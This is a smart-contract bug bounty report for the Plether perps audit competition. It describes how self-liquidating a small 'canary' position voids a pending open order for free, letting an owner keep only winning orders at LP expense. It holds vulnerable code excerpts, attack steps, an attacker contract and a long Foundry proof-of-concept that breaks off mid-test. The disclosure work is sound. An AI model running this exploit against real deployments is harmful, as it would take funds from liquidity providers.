# \#98941 [SC-Critical] Liquidation cleanup refunds a pending open in OrderRouter, so an owner cancels its own pinned open for free and takes LP funds

**Submitted on Nov 11th 2026 at 03:02:28 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98941
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An open order's fill price is pinned to the first Pyth tick after its commit, and SECURITY.md says there is no user cancellation path, so a queued open cannot become a free option. Liquidation cleanup is a cancellation path. The owner opens a tiny same-side canary position and commits a large same-side open T on the same account. When the price moves against T after the pinned tick is public, the owner, or any keeper, liquidates the canary; cleanup fails T as `AccountLiquidated` and refunds its committed margin for the forfeited bounty only. When the price moves T's way, the owner fills T at the stale pinned price. The owner keeps the upside and pays almost nothing on the downside, and the loss comes out of the LP pool. In the run below, five rounds end with the attacker withdrawing 8,374.65 USDG more than it put in, and the victim LP's Junior worth 9,977.92 USDG less than with no attacker.

## Vulnerability Details

A trader commits an open through `Router.commitOrder`. Its fill is priced from the first Pyth update after the commit, so the executor cannot pick the price: the oracle parses with `minPublishTime = request.commitTime + 1` (`PletherOracle.sol:610`). `Router.executeLiquidation` has no caller restriction (`OrderRouter.sol:493-496`).

The owner holds two things on one account: a tiny canary position and the pending open T. A LONG gains when the basket price falls, so an adverse move for a LONG open is a rise. The engine decides whether the canary is liquidatable from its exact-price health test. That test reads `settlementReachableAssets = pos.margin + snap.traderClaimBalanceForAccount + snap.vpiRebateReserveAssets` (`CfdEnginePlanLib.sol:1453`) and passes `pos.margin + snap.traderClaimBalanceForAccount` into `buildExactPriceRiskState` (`CfdEnginePlanLib.sol:1456-1463`). The pending open's committed margin is in neither. T reserves 40,000 USDG, yet the canary's liquidation threshold is 10 bp whether T is pending or not. So the owner makes the account liquidatable on demand with a 1,100 USDG canary that carries a 10 bp cushion, while 40,000 USDG of its own reserved collateral sits one field away and is ignored.

`Router.executeLiquidation` reaches `_executeLiquidationAtPrice`, which liquidates the position and then calls `_clearLiquidatedAccountOrders` (`router/OrderLiquidationHandler.sol:62-71`). That loop releases every pending order's reservation and fails it as `AccountLiquidated` (`router/OrderLiquidationHandler.sol:118-119`). T's committed margin returns to the account. The whole cost of voiding T is the forfeited open bounty, at most 0.20 USDG.

The guard that should stop this is the order lifecycle rule stated in SECURITY.md:658-659: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options". Liquidation cleanup is a user-reachable cancellation path, and the owner opens the canary that triggers it. Nothing in the liquidation path compares T's committed margin against the loss it is meant to cover.

### Vulnerable source code

**1. The fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610
```solidity
        uint64 minPublishTime = request.commitTime + 1;
```

**2. Anyone liquidates an account** @ packages/perps/src/OrderRouter.sol:493-496
```solidity
    function executeLiquidation(
        address account,
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant {
```

**3. The liquidation health test omits the pending open's committed margin** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:1453-1463
```solidity
        uint256 settlementReachableAssets = pos.margin + snap.traderClaimBalanceForAccount + snap.vpiRebateReserveAssets;
        delta.liquidationReachableCollateralAssets = settlementReachableAssets;

        delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
            pos,
            snap.positionEntryCostAssetAtoms,
            price,
            snap.capPrice,
            pos.margin + snap.traderClaimBalanceForAccount,
            maintMarginBps
        );
```

**4. Liquidation cleanup refunds every pending open and fails it as AccountLiquidated** @ packages/perps/src/router/OrderLiquidationHandler.sol:116-120
```solidity
            clearinghouse.releaseOrderReservationForTerminalCleanup(orderId);
            emit OrderFailed(orderId, OrderFailReason.AccountLiquidated);
            _deleteOrder(orderId, IOrderRouterAccounting.OrderStatus.Failed);
```

**5. The cleanup is reached from the public liquidation path** @ packages/perps/src/router/OrderLiquidationHandler.sol:62-71
```solidity
        outcome = engine.liquidatePosition(account, executionPrice, housePoolDepth, publishTime, keeper);
        _clearLiquidatedAccountOrders(
            account,
            orderIds,
            orderBountiesAssets,
            executionPrice,
            neutralMarkPrice,
            housePoolDepth,
            publishTime,
            keeper
        );
```

## Impact Details

- Impact row: **"Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield"** (Critical). Over five rounds the attacker withdraws its whole balance and ends with 508,374.65 USDG against the 500,000.00 USDG it deposited, +8,374.65 USDG. The victim LP's Junior is worth 9,990,022.08 USDG against 9,999,999.99 USDG with no attacker, -9,977.92 USDG, and -21,010.53 USDG against the honest control.
- Prerequisites, all permissionless: trading capital in an ordinary contract account, a 1,100 USDG same-side canary position, and the large same-side open T. No LP position, no keeper or owner role, no special pool state.
- The victim never sees a cancellation. The owner never calls `settleLpEpoch` and never moves pool depth. The open fails as `AccountLiquidated`, the same receipt an ordinary liquidated account produces.
- It repeats every round. Each adverse round voids T for the canary's loss of about 3.52 USDG; each favorable round fills T at the stale pinned price. The same five orders without the lever lose 15,036.16 USDG.
- An unrelated keeper liquidating the canary also voids T, so the owner does not need to send the liquidation itself.
- Dedup. SC-M4 in the pre-audit report is a free-option attack where "the attacker can trigger a full margin refund on the losing order by manipulating the vault depth", marked "Fixed in Plether-Fi/plether-core#24." The program rule is: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." The run is at that commit, and T is voided with no vault-depth change. My confirmed report #97858 voids its open through `settleLpEpoch` and a pool-cash change, so the open fails the planner with `PlannerRejected`, fixed by pinning pool depth. This report voids the open through liquidation cleanup, so it fails with `AccountLiquidated`, and the root is the missing pending-open margin in `CfdEnginePlanLib.sol:1453`. Pinning pool depth does not touch this path, and counting the pending-open margin does not touch #97858. Different root, different fix.

## References

Order pricing and liquidation entry
- packages/perps/src/PletherOracle.sol:610 - fill pinned to the first update after `commitTime`
- packages/perps/src/OrderRouter.sol:493-496 - `executeLiquidation`, any caller

Liquidation health test and cleanup
- packages/perps/src/libraries/CfdEnginePlanLib.sol:1453-1463 - exact-price health test, pending-open margin omitted
- packages/perps/src/router/OrderLiquidationHandler.sol:62-71 - cleanup reached from the public liquidation path
- packages/perps/src/router/OrderLiquidationHandler.sol:116-120 - every pending open refunded and failed `AccountLiquidated`

Guarantee and prior finding
- packages/perps/SECURITY.md:658-659 - "lack of a user cancellation path"
- audits/plether-pre-audit-report.pdf, SC-M4 - "Fixed in Plether-Fi/plether-core#24."



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/5036463a61c9ad9db6b3e2d31cc9f1a7

## Proof of Concept

## Proof of Concept

One Foundry test file on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters, asserted in `setUp`. It drives only public calls and reads every number back from the deployed contracts: the attacker's USDG wallet after withdrawal, the victim's Junior value from the vault, and the voided open's terminal receipt. Only USDG and Pyth are the repo's mocks, as the program permits.

All files and the full run output are in a secret gist: https://gist.github.com/decies-centena-millia/5036463a61c9ad9db6b3e2d31cc9f1a7

```bash
mkdir -p packages/perps/test/poc && cp LiquidationCleanupFreeCancelPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/LiquidationCleanupFreeCancelPoC.t.sol -vv
```

### attack step-by-step

1. Monday 10:00 UTC: victim LP_J holds 10,000,000 USDG of Junior. ATTACKER funds a `CanaryAccount` with 500,000 USDG.
2. Each round the account opens a 1,100 USDG same-side canary position, filled by a keeper at the mark. The canary carries a 10 bp cushion.
3. The account commits the 2,000,000 USDG open T with 40,000 USDG of margin. T pins to the next tick at the current price.
4. Favorable move (price falls for the LONG): `executeOrder` fills T at the stale pinned price, and the account closes at the better price.
5. Adverse move (price rises): `executeLiquidation(self)` at the moved price liquidates the canary; cleanup fails T as `AccountLiquidated` and refunds its 40,000 USDG. The account is flat for about 3.52 USDG.
6. After five rounds the account withdraws its whole balance to the attacker's wallet.

## main Attack code

```solidity
// The attacker's trading account. It never calls settleLpEpoch and never touches pool depth.
// Its only lever is executeLiquidation(address(this)) on its own canary, which cleans up the pending open.
contract CanaryAccount {
    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    function execute(uint64 id, bytes[] calldata pinned) external onlyOwner returns (OrderV3Types.ExecutionResult memory r) {
        r = router.executeOrder(id, pinned);
    }

    // The whole lever: liquidate this account's own canary at the moved price. Cleanup voids every pending order.
    function voidViaOwnLiquidation(bytes[] calldata live) external onlyOwner {
        router.executeLiquidation(address(this), live);
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = clearinghouse.balanceAssets(address(this));
        if (bal != 0) clearinghouse.withdrawMargin(bal);
        uint256 w = usdg.balanceOf(address(this));
        if (w != 0) usdg.transfer(owner, w);
    }
}
```

```solidity
// one round: canary, then the open T pinned at PX, then the owner's decision after the move
_openCanary();
uint64 t = _commit(CfdTypes.Side.LONG, _sizeFor(T_NOTIONAL, PX), T_MARGIN, false);
_advance(1);  // commit + 1: the pinned tick exists at PX
_advance(2);  // the owner has now seen the move
uint256 p1 = _price(_favorable(k));

if (_favorable(k)) {
    require(_executed(_ownerExec(t, PX)), "favorable fill at stale pin");  // fill T at the stale price
    _closeAll(p1);                                                         // close at the better price
} else {
    bytes[] memory d = _tick(p1, _now());
    vm.prank(ATTACKER);
    acct.voidViaOwnLiquidation(d);                                        // liquidate the canary, void T
    require(_reason(t) == OrderV3Types.TerminalReason.AccountLiquidated, "T voided via liquidation cleanup");
    require(_sizeOf(address(acct)) == 0, "flat after void");
}
```

```
plant : open a tiny same-side canary, then commit the large same-side open T pinned to the next tick
fire  : liquidate your own canary; cleanup voids T and refunds its 40,000 USDG margin, so you only ever keep T when it already won
```

### full poc code, single file, single runnable command

Foundry `forge 1.8.5` (commit `51a52c59`), `solc 0.8.35`, `via_ir = true`, `optimizer_runs = 200`, from the repo's own `packages/perps/foundry.toml`. The test runs on the repo's `test/perps/BasePerpTest.sol` fixture, which is provided by the program, so only this one file is added.

`LiquidationCleanupFreeCancelPoC.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: liquidation cleanup is a price-conditional, (near-)free cancel of a pending open.
// Sibling of the confirmed Critical #97858 (lp-settlement-cancels-own-open): same impact row and same class
// (the owner decides after the pinned tick prints whether its own open fills), but a DIFFERENT root and a DIFFERENT fix.
//
//   - #97858's void path: owner moves pool cash with settleLpEpoch, the open fails the planner with SOLVENCY_EXCEEDED,
//     terminal reason PlannerRejected (7). Fix: pin pool depth / defer LP settlement.
//   - This path: the open never reaches the planner. The owner (or any keeper) liquidates a tiny same-account "canary"
//     position; liquidation cleanup fails every pending order of the account as AccountLiquidated (9) and refunds its
//     committed margin (router/OrderLiquidationHandler.sol:56-73,:100-139). No settleLpEpoch, no pool-depth change.
//     Root: the liquidation health test counts pos.margin + traderClaim + vpiReserve only (CfdEnginePlanLib.sol:1453-1461),
//     never the pending open's committed margin, so the canary is liquidatable even though the account's reserved
//     collateral dwarfs the loss. Fix: count committed pending-open margin as reachable collateral (or charge a real
//     fee when cleanup voids a pending open). #97858's depth-pinning fix leaves this untouched.
//
// Repo's own Foundry suite at a82d4fef on BasePerpTest with the DEPLOYMENT.md release parameters; only USDG (MockSettlementToken)
// and Pyth (MockPyth) are the repo's mocks, as the AC permits. Every number in the impact section is read back from the
// deployed contracts (clearinghouse balances, HousePool/Junior NAV, terminal receipts, emitted events), not computed by the test.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

// ======================================================================= base (release config + helpers)

abstract contract LiqBase is BasePerpTest {
    uint256 internal constant PX = 1e8;
    uint64 internal constant CONF = 2e4; // 2 bps of the 1.00 price on each feed (release adverse-confidence shift applies)

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant KEEPER = address(0x4B33);
    address internal constant LP_J = address(0x1117);

    uint256 internal constant WEEK_MON_10UTC = 1_728_900_000;

    // DEPLOYMENT.md release parameters (identical to the confirmed #97858 PoC).
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        uint256 start = vm.getBlockTimestamp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(routerConfig);
        vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        // Assert the live config equals DEPLOYMENT.md (production-faithful), so the fixture cannot silently drift.
        _assertReleaseConfig();
    }

    function _assertReleaseConfig() internal view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            ,
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(maintMarginBps, 10, "maintMarginBps");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(fadMarginBps, 300, "fadMarginBps");
        assertEq(baseCarryBps, 500, "baseCarryBps");
        assertEq(minBountyAssets, 1e6, "minBountyAssets");
        assertEq(bountyBps, 10, "bountyBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "minOpenNotionalAssets");
        assertEq(router.maxExecutionWindowSeconds(), 60, "maxExecutionWindowSeconds");
        assertFalse(engine.isFadWindow(), "live market, not FAD");
        assertFalse(engine.isOracleFrozen(), "live market, not frozen");
    }

    // via-IR caches block.timestamp inside one frame: read time from the cheatcode.
    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _advance(uint256 s) internal {
        vm.warp(vm.getBlockTimestamp() + s);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _warpTo(uint256 ts) internal {
        vm.warp(ts);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick(uint256 price, uint256 t) internal pure returns (bytes[] memory updateData) {
        int64 p = int64(uint64(price));
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        updates[0] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_A, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updates[1] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_B, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 nonce)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("liqcleanup", nonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitTime(uint64 id) internal view returns (uint256) {
        (IOrderRouterAccounting.PendingOrderView memory v,) = router.getPendingOrderView(id);
        return uint256(v.commitTime);
    }

    function _live(uint256 price) internal {
        bytes[] memory d = _tick(price, _now());
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    function _settleBy(address caller, uint256 price) internal {
        bytes[] memory d = _tick(price, _now());
        vm.prank(caller);
        router.settleLpEpoch(d);
    }

    function _executed(OrderV3Types.ExecutionResult memory r) internal pure returns (bool) {
        return r.terminalReason == OrderV3Types.TerminalReason.Executed;
    }

    function _sizeFor(uint256 notionalAssets, uint256 price) internal pure returns (uint256) {
        return ((notionalAssets * 1e20 / price) / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
    }

    function _sizeOf(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _marginOf(address account) internal view returns (uint256 margin) {
        (, margin,,,,,) = engine.positions(account);
    }

    function _reason(uint64 id) internal view returns (OrderV3Types.TerminalReason) {
        return router.lifecycleBook().terminalOutcome(id).reason;
    }

    function _status(uint64 id) internal view returns (OrderV3Types.LifecycleStatus) {
        return router.lifecycleBook().terminalOutcome(id).status;
    }

    function _usd(uint256 atoms) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(atoms % 1e6 + 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) frac[i] = f[i + 1];
        return string.concat(vm.toString(atoms / 1e6), ".", string(frac));
    }

    function _usdSigned(int256 atoms) internal pure returns (string memory) {
        return atoms < 0 ? string.concat("-", _usd(uint256(-atoms))) : string.concat("+", _usd(uint256(atoms)));
    }

    function _dumpLogs(string memory step, Vm.Log[] memory logs) internal pure {
        console2.log("   raw system events of", step);
        for (uint256 i; i < logs.length; ++i) {
            console2.log("     event", i, logs[i].emitter);
            for (uint256 k; k < logs[i].topics.length; ++k) console2.logBytes32(logs[i].topics[k]);
            console2.logBytes(logs[i].data);
        }
    }
}

// ======================================================================= attacker account

interface IAcctRouter {
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function executeLiquidation(address account, bytes[] calldata pythUpdateData) external payable;
}

interface IAcctClearinghouse {
    function depositMargin(uint256 amount) external;
    function withdrawMargin(uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
}

/// @notice An ordinary contract trading account. It never calls settleLpEpoch and never touches pool depth.
///         Its only lever is executeLiquidation(address(this)) on its own canary, which cleans up the pending open.
contract CanaryAccount {
    address internal immutable owner;
    IAcctRouter internal immutable router;
    IAcctClearinghouse internal immutable clearinghouse;
    IERC20 internal immutable usdg;

    constructor(address router_, address clearinghouse_, address usdg_) {
        owner = msg.sender;
        router = IAcctRouter(router_);
        clearinghouse = IAcctClearinghouse(clearinghouse_);
        usdg = IERC20(usdg_);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function fund(uint256 amount) external onlyOwner {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    function execute(uint64 id, bytes[] calldata pinned)
        external
        onlyOwner
        returns (OrderV3Types.ExecutionResult memory r)
    {
        r = router.executeOrder(id, pinned);
    }

    /// @dev The whole lever: liquidate this account's own canary at the moved price. Cleanup voids every pending order.
    function voidViaOwnLiquidation(bytes[] calldata live) external onlyOwner {
        router.executeLiquidation(address(this), live);
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = clearinghouse.balanceAssets(address(this));
        if (bal != 0) clearinghouse.withdrawMargin(bal);
        uint256 w = usdg.balanceOf(address(this));
        if (w != 0) usdg.transfer(owner, w);
    }
}

// ======================================================================= the PoC

contract LiquidationCleanupFreeCancelPoC is LiqBase {
    uint256 internal constant DEPTH = 10_000_000e6; // victim LP_J Junior
    uint256 internal constant FUND = 500_000e6; // attacker trading capital
    uint256 internal constant CANARY_NOTIONAL = 1_100e6;
    uint256 internal constant T_NOTIONAL = 2_000_000e6;
    uint256 internal constant T_MARGIN = 40_000e6;
    uint256 internal constant MOVE_BP = 30;
    uint256 internal constant ROUNDS = 5;

    enum Mode {
        Attack,
        Honest,
        Baseline
    }

    struct Outcome {
        uint256 attackerWallet;
        uint256 victimValue;
        int256[ROUNDS] roundPnl;
        uint256 voids; // AccountLiquidated voids of T
        uint256 fills; // stale-pin fills of T
    }

    CanaryAccount internal acct;
    uint256 internal nonce;

    // A,F,A,A,F. In Plether a LONG gains when the basket price falls (it is short the USD-quoted basket),
    // so FAVORABLE for the LONG open = price DOWN (fill at the stale higher pin, profit), ADVERSE = price UP (the LONG
    // would lose, so the owner voids it; the canary LONG is liquidatable on the up move).
    function _favorable(uint256 k) internal pure returns (bool) {
        return k == 1 || k == 4;
    }

    function _price(bool favorable) internal pure returns (uint256) {
        return favorable ? PX - (PX * MOVE_BP) / 10_000 : PX + (PX * MOVE_BP) / 10_000;
    }

    function _commit(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose, ++nonce);
        vm.prank(ATTACKER);
        id = acct.commit(req);
    }

    function _keeperExec(uint64 id, uint256 price) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tick(price, _commitTime(id) + 1);
        vm.prank(KEEPER);
        r = router.executeOrder(id, d);
    }

    function _ownerExec(uint64 id, uint256 price) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tick(price, _commitTime(id) + 1);
        vm.prank(ATTACKER);
        r = acct.execute(id, d);
    }

    // Smallest canary margin (0.02 USDG steps) the deployed lens previews as OK at PX.
    function _canaryMargin(uint256 size) internal view returns (uint256 m) {
        for (m = 1e6; m < 200e6; m += 2e4) {
            if (engineLens.previewOpenRevertCode(address(acct), CfdTypes.Side.LONG, size, m, PX) == 0) return m;
        }
        revert("no canary margin");
    }

    // Smallest adverse (up) move in bp at which `account` is liquidatable right now (LONG loses as price rises).
    function _liqThresholdBp(address account) internal view returns (uint256) {
        uint256 depth = pool.totalAssets();
        for (uint256 bp = 1; bp < 400; ++bp) {
            if (engineLens.isLiquidatableAt(account, PX + (PX * bp) / 10_000, depth)) return bp;
        }
        return type(uint256).max;
    }

    function _openCanary() internal returns (uint64 id) {
        uint256 size = _sizeFor(CANARY_NOTIONAL, PX);
        id = _commit(CfdTypes.Side.LONG, size, _canaryMargin(size), false);
        _advance(1);
        require(_executed(_keeperExec(id, PX)), "canary fill");
        _advance(1);
        _live(PX);
    }

    function _closeAll(uint256 price) internal {
        _live(price);
        uint64 id = _commit(CfdTypes.Side.LONG, _sizeOf(address(acct)), 0, true);
        _advance(1);
        require(_executed(_keeperExec(id, price)), "close");
    }

    // ---- setup

    function _setup() internal {
        _warpTo(WEEK_MON_10UTC);
        _fundJunior(LP_J, DEPTH);
        _advance(5);
        _live(PX);
        settlementToken.mint(ATTACKER, FUND);
        vm.prank(ATTACKER);
        acct = new CanaryAccount(address(router), address(clearinghouse), address(settlementToken));
        vm.prank(ATTACKER);
        settlementToken.approve(address(acct), FUND);
        vm.prank(ATTACKER);
        acct.fund(FUND);
    }

    // ---- one round

    function _round(uint256 k, Mode mode) internal returns (int256 pnl) {
        _advance(30); // forward-only separation between rounds; the oracle requires monotonic feed times
        _live(PX);
        if (mode == Mode.Baseline) return 0;

        uint256 w0 = clearinghouse.balanceAssets(address(acct));
        _openCanary();

        _advance(1);
        uint64 t = _commit(CfdTypes.Side.LONG, _sizeFor(T_NOTIONAL, PX), T_MARGIN, false);
        _advance(1); // commit + 1: the pinned tick exists at PX
        _advance(2); // the owner has now seen the move
        uint256 p1 = _price(_favorable(k));

        if (mode == Mode.Attack) {
            if (_favorable(k)) {
                // fill T at the stale pinned PX, then close the whole position at the better price
                require(_executed(_ownerExec(t, PX)), "favorable fill at stale pin");
                _closeAll(p1);
            } else {
                // adverse: liquidate our own canary; cleanup voids T for the forfeited bounty only
                bytes[] memory d = _tick(p1, _now());
                vm.prank(ATTACKER);
                acct.voidViaOwnLiquidation(d);
                require(_status(t) == OrderV3Types.LifecycleStatus.Failed, "T failed");
                require(_reason(t) == OrderV3Types.TerminalReason.AccountLiquidated, "T voided via liquidation cleanup");
                require(_sizeOf(address(acct)) == 0, "flat after void");
            }
        } else {
            // Honest: a keeper fills T at the pinned tick every round; the trader carries the move and closes.
            require(_executed(_keeperExec(t, PX)), "honest keeper fill");
            _closeAll(p1);
        }

        // pnl is read from clearinghouse custody; the next round's _warpTo + _live(PX) resets the mark.
        pnl = int256(clearinghouse.balanceAssets(address(acct))) - int256(w0);
    }

    // ---- one world

    function _run(Mode mode) internal returns (Outcome memory o) {
        for (uint256 k; k < ROUNDS; ++k) {
            o.roundPnl[k] = _round(k, mode);
            if (mode == Mode.Attack) {
                if (_favorable(k)) ++o.fills;
                else ++o.voids;
            }
        }
        // withdraw everything the attacker holds to its wallet, then read the victim's Junior value from system NAV
        vm.prank(ATTACKER);
        acct.withdrawAll();
        o.attackerWallet = settlementToken.balanceOf(ATTACKER);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(LP_J));
    }

    // =================================================================== tests

    /// @notice System-read proof of the ROOT (different fix): the liquidation health test ignores the pending open's
    ///         committed margin, so the 40,000 USDG reserved by T does not move the canary's liquidation threshold.
    function test_root_healthTestIgnoresPendingOpenMargin() public {
        _setup();
        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 10 minutes);
        _live(PX);
        _openCanary();

        uint256 thrNoPending = _liqThresholdBp(address(acct));
        uint256 marginBefore = _marginOf(address(acct));

        _advance(1);
        uint64 t = _commit(CfdTypes.Side.LONG, _sizeFor(T_NOTIONAL, PX), T_MARGIN, false);
        _advance(1);
        uint256 thrWithPending = _liqThresholdBp(address(acct));

        console2.log("canary position margin (USDG atoms)      ", marginBefore);
        console2.log("T committed/reserved margin (USDG atoms) ", T_MARGIN);
        console2.log("canary liquidation threshold, no pending T (bp adverse) ", thrNoPending);
        console2.log("canary liquidation threshold, with pending T (bp adverse)", thrWithPending);
        assertGt(T_MARGIN, marginBefore * 1000, "T reserves >1000x the canary's position margin");
        assertEq(
            thrWithPending, thrNoPending, "40,000 USDG of committed pending-open margin does not move the liquidation threshold"
        );
        // T has not been voided here: it has no terminal outcome yet (status None) and its pending view still names the account.
        assertEq(uint256(_status(t)), uint256(OrderV3Types.LifecycleStatus.None), "T has no terminal outcome: still pending");
        assertEq(_pending(t).committedMarginAssets, T_MARGIN, "T is a live pending open with 40,000 USDG of committed margin reserved");
        console2.log("=> the health test (CfdEnginePlanLib.sol:1453-1461) omits the pending open's margin: that is the root");
        console2.log("=> counting it (the fix) would push the threshold past any realistic move; #97858's depth-pinning fix is unrelated");
    }

    function _pending(uint64 id) internal view returns (IOrderRouterAccounting.PendingOrderView memory v) {
        (v,) = router.getPendingOrderView(id);
    }

    /// @notice System-read proof the void travels a DIFFERENT path than #97858: terminal reason AccountLiquidated (9),
    ///         reached with no settleLpEpoch and no pool-depth change. Raw receipt + events are dumped.
    function test_path_voidIsAccountLiquidation_noLpSettlement() public {
        _setup();
        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 10 minutes);
        _live(PX);
        _openCanary();
        _advance(1);
        uint64 t = _commit(CfdTypes.Side.LONG, _sizeFor(T_NOTIONAL, PX), T_MARGIN, false);
        _advance(3);

        uint256 depthBefore = pool.totalAssets();
        uint256 p1 = _price(false); // adverse = up
        bytes[] memory d = _tick(p1, _now());
        vm.recordLogs();
        vm.prank(ATTACKER);
        acct.voidViaOwnLiquidation(d);
        _dumpLogs("executeLiquidation(self): canary liquidated + T voided", vm.getRecordedLogs());

        OrderV3Types.TerminalOutcome memory oc = router.lifecycleBook().terminalOutcome(t);
        console2.log("T terminal status (3 = Failed)        ", uint256(oc.status));
        console2.log("T terminal reason (9 = AccountLiquidated, NOT 7 PlannerRejected)", uint256(oc.reason));
        console2.log("pool.totalAssets before / after the void", depthBefore, pool.totalAssets());
